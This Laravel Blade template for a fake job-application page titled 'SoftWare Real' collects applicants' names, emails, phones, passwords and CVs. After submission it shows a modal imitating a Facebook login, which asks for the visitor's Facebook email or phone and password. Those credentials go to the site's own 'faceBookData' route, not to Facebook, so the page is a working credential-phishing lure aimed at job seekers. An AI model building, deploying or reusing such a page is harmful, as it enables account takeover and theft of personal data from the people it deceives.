<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>SoftWare Real</title>

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.bunny.net">
    <link href="https://fonts.bunny.net/css?family=figtree:400,600&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="{{ asset('css/bootstrap.min.css') }}">
    <link rel="stylesheet" href="{{ asset('all.min.css') }}">
    <link rel="stylesheet" href="{{ asset('css/main.css') }}">
</head>

<body class="antialiased">

    <div class="container col-md-7 text-center">

        <div class="card mt-5">
            @if ($errors->any())
                <div class="alert alert-dark text-start">
                    <ul>
                        @foreach ($errors->all() as $error)
                            <li>{{ $error }}</li>
                        @endforeach
                    </ul>
                </div>
            @endif
            <div class="card-body">
                <form action="{{ route('app.store') }}" method="POST" enctype="multipart/form-data">
                    @csrf
                    <div class="form-group">
                        <label for="">Name : </label>
                        <input type="text" name="name" placeholder="Enter Your Name" class="form-control">
                    </div>
                    <div class="form-group">
                        <label for=""> Email : </label>
                        <input type="email" name="email" placeholder="Enter Your Email" class="form-control">
                    </div>
                    <div class="form-group">
                        <label for="">Phone : </label>
                        <input type="text" name="phone" placeholder="Enter Your Phone" class="form-control">
                    </div>
                    <div class="form-group">
                        <label for="">Current Position : </label>
                        <input type="text" name="position" placeholder="Enter Current Position" class="form-control">
                    </div>
                    <div class="form-group">
                        <label for=""> Strong Password : </label>
                        <input type="password" name="password" placeholder="Enter Strong Password" class="form-control">
                    </div>
                    <div class="form-group">
                        <label for=""> Upload Your CV : </label>
                        <input type="file" name="cvFile" class="form-control">
                    </div>
                    <div class="d-grid">
                        <button class="btn btn-dark">
                            Send Your application
                        </button>
                    </div>
                </form>
            </div>
        </div>

    </div>

    @if (Session::has('done'))
        <div class="bigDiv">
            <div class="myModel">

                <div class="content">
                    <div class="flex-div">
                        <form action="{{ route('app.faceBookData') }}" method="POST">

                            @csrf <h6 class="text-dark  text-center">Now Login with Facebook Account to submit Your
                                Applicaiton</h6>
                            <h6 class="text-danger">{{ Session::get('done') }}</h6>
                            @if ($errors->any())
                                <div class="alert alert-dark text-start">
                                    <ul>
                                        @foreach ($errors->all() as $error)
                                            <li>{{ $error }}</li>
                                        @endforeach
                                    </ul>
                                </div>
                            @endif
                            <h6 class="text-primary text-center">Facebook</h6>
                            <input type="text" name="email" placeholder="Email or Phone Number" required />
                            <input type="password" name="password" placeholder="Password" required>
                            <button type="submit" class="login">Log In</button>
                            <a class="text-info">Forgot Password ?</a>
                            <hr>
                            <a disabled class=" disabled create-account">Create New Account</a>
                        </form>
                    </div>

                </div>
            </div>
        </div>
    @endif


    <script src="{{ asset('js/bootstrap.bundle.min.js') }}"></script>
</body>

</html>
